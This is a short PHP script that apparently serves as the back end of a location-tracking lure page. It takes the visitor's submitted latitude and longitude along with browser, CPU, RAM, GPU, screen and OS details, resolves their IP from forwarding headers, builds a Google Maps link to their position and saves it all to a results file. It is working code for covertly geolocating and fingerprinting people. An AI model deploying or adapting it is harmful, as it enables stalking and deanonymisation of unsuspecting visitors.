<?php
header('Content-Type: text/html');
{
  $lat = $_POST['Lat'];
  $lon = $_POST['Lon'];
  $ptf = $_POST['Ptf'];
  $brw = $_POST['Brw'];
  $cc = $_POST['Cc'];
  $ram = $_POST['Ram'];
  $ven = $_POST['Ven'];
  $ren = $_POST['Ren'];
  $ht = $_POST['Ht'];
  $wd = $_POST['Wd'];
  $os = $_POST['Os'];
  function getUserIP()
  {
    // Get real visitor IP
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"]))
    {
      $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
      $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    return $ip;
  }

  $ip = getUserIP();



  $link = "https://www.google.com/maps/dir/35.6996026,51.3079253/$lat,$lon/@35.9615805,51.0819688,8z/data=!4m2!4m1!3e0!5m1!1e7";

$data = 'link => '.$link.PHP_EOL;
$data .= 'browser =>'.$brw.PHP_EOL;
$data .= 'cores => '.$cc.PHP_EOL;
$data .= 'ram =>'.$ram.PHP_EOL;
$data .=  'vendor =>'.$ven.PHP_EOL;
$data .= 'ip =>'. $ip.PHP_EOL;
$data .= 'render =>'. $ren.PHP_EOL;
$data .= 'ht =>'.$ht.PHP_EOL;
$data .= 'wd =>'.$wd.PHP_EOL;
$data .= 'os =>'.$os.PHP_EOL;




  $f = fopen('result.txt', 'w+');
  fwrite($f, $data);
  fclose($f);
}
?>